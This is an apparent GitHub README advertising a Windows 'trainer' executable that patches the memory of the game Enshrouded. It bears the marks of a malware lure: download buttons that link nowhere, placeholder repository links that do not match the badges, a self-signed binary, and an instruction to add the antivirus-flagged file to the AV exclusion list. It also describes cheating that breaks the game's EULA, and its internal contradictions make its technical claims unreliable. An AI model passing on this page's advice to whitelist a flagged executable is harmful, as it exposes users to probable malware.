<div align="center">
<img src="https://capsule-render.vercel.app/api?type=rounded&color=gradient&customColorList=12&height=231&section=header&text=Enshrouded%20Trainer%202026&fontSize=55&fontColor=fff&animation=blink&fontAlignY=38&desc=Windows%20Tool%202026&descAlignY=56&descSize=20" width="100%"/>
<h1>⚡ Enshrouded Trainer 2026 ⚡</h1>

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
![Last Updated](https://img.shields.io/badge/updated-December_2026-lightgrey?style=for-the-badge)
![Stargazers](https://img.shields.io/github/stars/Bufferbeyondfeel/cobalt-trainer?style=for-the-badge)
![Downloads](https://img.shields.io/github/downloads/Bufferbeyondfeel/cobalt-trainer/total?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="#">
    <img src="https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=007E33" width="553" alt="Download Enshrouded Trainer 2026"/>
  </a>
</p>
</div>

---

## Table of Contents
- [About / Overview](#about--overview)
- [Requirements](#requirements)
- [Features](#features)
- [Installation](#installation)
- [FAQ](#faq)
- [Community / Support](#community--support)
- [License](#license)
- [Disclaimer](#disclaimer)
- [Download](#download)

---

## About / Overview

**cobalt-trainer** is a standalone, compiled Windows executable that modifies runtime memory of the game *Enshrouded* to enable extended inventory manipulation, character parameter overrides, and game state edits. The trainer operates entirely in user-space, reading and writing process memory via the Win32 API. No injection, DLL hooking, or kernel-mode drivers are employed.

> [!NOTE]
> This tool is designed for offline play or private server use only. Memory modifications will not function if the game’s anti-tamper integrity checks are active during online sessions.

The trainer exposes a command-line interface (CLI) via a lightweight GUI overlay. All interactions are discrete key-bound activations. The executable is signed with a self-generated certificate for Windows Defender compatibility.

---

## Requirements

- **Operating System:** Windows 10 (build 1909 or later) or Windows 11. 64-bit architecture required.
- **Game Version:** Enshrouded 1.0.x (any update through December 2026 supported via YAML configuration).
- **Runtime:** No additional frameworks (Python, .NET, Java) are required. The binary is statically linked with all dependencies.
- **Permissions:** Run as a standard user. No admin elevation is strictly required unless the game is installed in a protected directory (e.g., `C:\Program Files`).

> [!IMPORTANT]
> The executable is flagged by some heuristic-based antivirus engines. This is a common false positive for memory-modifying tools. Add the file to your AV exclusion list after verifying the SHA-256 checksum available on the [Releases page](#).

- **Disk Space:** ~22 MB for the installer.
- **Memory:** 512 MB free RAM during operation.

---

## Features

### Core Feature Set

- **God Mode / Infinite Health:** Writes constant values to the health register at a 60 Hz tick rate. Prevents death from fall damage, drowning, or combat.
- **Stamina Lock:** Disables stamina decay by overwriting the stamina drain coefficient every frame. Allows infinite sprinting and climbing.
- **Item Quantity Modifier:** Set stack sizes for any inventory item from 1 to 99,999. Functionality persists through game save loads until the item is consumed.
- **Unlimited Durability:** Prevents weapon, tool, and armor condition decrement. Assigns a fixed hex value to the durability pointer.
- **No Hunger / Thirst:** Overrides the hydration and saturation variables. Player status never drops below 100%.
- **Movement Speed Multiplier:** Scale player base movement speed by a factor between 0.5x and 10.0x. Modifies the character controller movement vector directly.
- **XP Multiplier:** Applies a scalar (1x–100x) to all experience point events. Works on kill, crafting, and exploration XP.
- **Fly Mode:** Enables vertical axis control independent of gravity. Maps keystrokes to positional displacement on the Z-axis.

Under the hood, each feature is a discrete memory patch applied against a process handle obtained via `OpenProcess` with `PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE`. Pointer offsets are resolved from a local `.json` map updated per game patch.

---

## Installation

1. **Download the installer** from the button below or the [Releases tab](https://github.com/owner-repo-placeholder/owner-repo-placeholder/releases). File: `cobalt-trainer-2026-setup.exe`.
2. **Run the installer.** Follow the on-screen prompts. Default installation path is `%LocalAppData%\cobalt-trainer\`.
3. **Launch the game.** Ensure *Enshrouded* is running and at the main menu before starting the trainer.
4. **Start `cobalt-trainer.exe`** from the installation directory. The GUI overlay will appear in the top-right corner. Feature toggles are bound to the `F1`–`F12` keys by default.

---

## FAQ

> [!TIP]
> For edge cases regarding specific game versions, check the `offsets_v2026.12.json` file in the install directory.

**Q: The trainer does not detect the game process. What should I do?**  
A: Ensure *Enshrouded* is launched directly (not through a third-party launcher) and that the executable name is `Enshrouded-Win64-Shipping.exe`. Restart the trainer after verifying the game is focused.

**Q: How do I update the trainer for a new game patch?**  
A: The trainer checks for an `offsets_*.json` update on startup. You can download the latest offset file from the repository under `/offsets/` and replace the existing file manually, or re-run the installer.

**Q: Can this trainer be used while playing on a hosted multiplayer server?**  
A: Only if the server does not enforce anti-cheat. Use at your own risk. We recommend private, whitelisted servers only.

**Q: Will using this trainer corrupt my save file?**  
A: No. The trainer operates on runtime memory only. It does not write to save data. However, modifying item stacks or character parameters may produce invalid states if the game runs integrity checks on save export. Keep a backup of `userdata.sav`.

---

## Community / Support

- **Discord Community:** [Click here to join](https://discord.gg/placeholder) (official support channel, feature requests, and beta access).
- **Bug Reports / Feature Requests:** Use the GitHub [Issues tab](https://github.com/owner-repo-placeholder/owner-repo-placeholder/issues).
- **Steam Guide:** Refer to the companion guide ID 123456 on the Steam Community Hub for a video walkthrough of hotkey configuration.

---

## License

This project is distributed under the **MIT License 2026**. See [LICENSE](./LICENSE) for full text.  
You are free to use, modify, and redistribute this software in accordance with the license terms. The authors accept no liability for misuse.

---

## Disclaimer

> [!CAUTION]
> This software modifies the runtime memory of *Enshrouded*. Using it violates the End User License Agreement (EULA) for the game. The developer of **cobalt-trainer** does not condone cheating in online competitive or ranked modes. This tool is provided for educational and offline sandbox purposes only. By downloading and using this software, you agree to hold the authors harmless against any account bans, game corruption, or system instability that may result. No warranty is provided, express or implied.

---

## Download

<div align="center">
<p align="center">
  <a href="#">
    <img src="https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=007E33" width="553" alt="Download Enshrouded Trainer 2026"/>
  </a>
</p>
</div>